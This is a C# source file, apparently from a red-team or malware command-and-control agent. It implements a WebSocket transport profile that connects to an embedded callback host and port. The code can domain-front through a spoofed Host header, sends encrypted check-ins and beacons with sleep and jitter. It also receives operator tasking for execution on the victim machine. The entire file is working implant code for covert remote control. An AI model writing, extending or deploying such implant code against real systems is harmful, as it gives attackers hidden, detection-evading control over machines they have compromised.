using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Net.WebSockets;
using System.Text.Json;
using Websocket.Client;

namespace Agent.Profiles.Websocket
{
    public class Websocket : IProfile
    {
        private ILogger logger { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private IMessageManager messageManager { get; set; }
        private ICryptoManager crypt { get; set; }
        private string url { get; set; }
        private string endpoint { get; set; }
        private string userAgent { get; set; }
        private string hostHeader { get; set; }
        public int connectAttempt { get; set; }    
        public int maxAttempts { get; set; }
        private WebsocketClient _client { get; set; }
        private Func<Task> startClient;
        private Func<bool> clientIsRunning;
        private TimeSpan connectionTimeout = TimeSpan.FromSeconds(30);
        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
        private bool checkedIn = false;
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private static readonly TimeSpan CheckinResponseTimeout = TimeSpan.FromSeconds(30);
        private CheckinResponse? cir;
        public Websocket(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                WebsocketChannelOptionsJsonContext.Default.WebsocketChannelOptions)
                ?? throw new InvalidOperationException("Invalid Websocket profile configuration");
            int callbackPort = opts.CallbackPort;
            string callbackHost = opts.CallbackHost;
            this.endpoint = opts.Endpoint;
            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = opts.UserAgent;
            this.hostHeader = opts.DomainFront;
            this.maxAttempts = 5;
            this.connectAttempt = 0;

            var factory = new Func<ClientWebSocket>(() =>
            {
                var client = new ClientWebSocket
                {
                    Options =
                    {
                        KeepAliveInterval = TimeSpan.FromSeconds(0),
                        // Proxy = ...
                        // ClientCertificates = ...
                    }
                };

                this._client.ReconnectTimeout = null;

                if (!String.IsNullOrEmpty(this.hostHeader))
                {
                    client.Options.SetRequestHeader("Host", this.hostHeader);
                }

                client.Options.SetRequestHeader("Accept-Type", "Push");
                //%CUSTOMHEADERS%

                return client;
            });


            this._client = new WebsocketClient(new Uri(this.url), factory);
            startClient = () => _client.Start();
            clientIsRunning = () => _client.IsRunning;
            this._client.MessageReceived.Subscribe(msg =>
            {
                HandleInboundMessage(msg.Text);
            });


            this._client.ReconnectionHappened.Subscribe(info =>
            {
            });
            this._client.DisconnectionHappened.Subscribe(info => {
            
            });
        }

        private void HandleInboundMessage(string content)
        {
            try
            {
                WebSocketMessage? wm = JsonSerializer.Deserialize(content, WebsocketJsonContext.Default.WebSocketMessage);
                if (wm is null)
                {
                    return;
                }

                string plaintext = this.crypt.Decrypt(wm.data);
                if (!checkedIn)
                {
                    CheckinResponse? response = JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
                    if (!CheckinResponseValidation.IsSuccessful(response))
                    {
                        return;
                    }

                    cir = response;
                    checkinAvailable.Set();
                    return;
                }

                GetTaskingResponse? gtr = JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr?.action != "get_tasking")
                {
                    return;
                }

                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                SetTaskingReceived?.Invoke(this, tra);
            }
            catch
            {
                // A malformed peer message must not fault the receive subscription.
            }
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            bool sent = false;
            do
            {
                if (await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                {
                    sent = true;
                    break;
                }

                this.connectAttempt++;
            } while (this.connectAttempt <= this.maxAttempts);

            if (!sent)
            {
                return new CheckinResponse { status = "failed" };
            }

            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
            {
                return new CheckinResponse { status = "failed" };
            }

            this.checkedIn = true;

            return this.cir!;
        }

        private static Task<bool> WaitForCheckinResponse(
            ManualResetEventSlim signal,
            TimeSpan timeout,
            CancellationToken cancellationToken) =>
            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);
        public async Task StartBeacon()
        {
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
                }
                catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                {
                    break;
                }

                if (!this.messageManager.HasResponses())
                {
                    continue;
                }
                try
                {
                    bool delivered = await messageManager.DeliverAsync(
                        this.Send,
                        result => result);
                    this.connectAttempt = delivered ? 0 : this.connectAttempt + 1;
                }
                catch (Exception e)
                {
                    this.connectAttempt++;
                }

                if (this.connectAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                    await this._client.Stop(WebSocketCloseStatus.EndpointUnavailable, "Exiting");
                    this._client.Dispose();
                }
            }
        }
        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }
        private async Task<bool> Send(string json)
        {
            if (!await EnsureStarted())
                return false;

            json = this.crypt.Encrypt(json);
            WebSocketMessage m = new WebSocketMessage()
            {
                client = true,
                data = json,
                tag = String.Empty
            };
            string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
            await this._client.SendInstant(message);
            return true;
        }

        private async Task<bool> EnsureStarted()
        {
            if (clientIsRunning())
            {
                return true;
            }

            Task operation = startClient();
            try
            {
                await operation.WaitAsync(connectionTimeout, cancellationTokenSource.Token);
                return clientIsRunning();
            }
            catch (TimeoutException)
            {
                ObserveFault(operation);
                return false;
            }
            catch (OperationCanceledException)
            {
                ObserveFault(operation);
                throw;
            }
        }

        private static void ObserveFault(Task operation) =>
            _ = operation.ContinueWith(
                task => _ = task.Exception,
                CancellationToken.None,
                TaskContinuationOptions.OnlyOnFaulted | TaskContinuationOptions.ExecuteSynchronously,
                TaskScheduler.Default);
    }
}
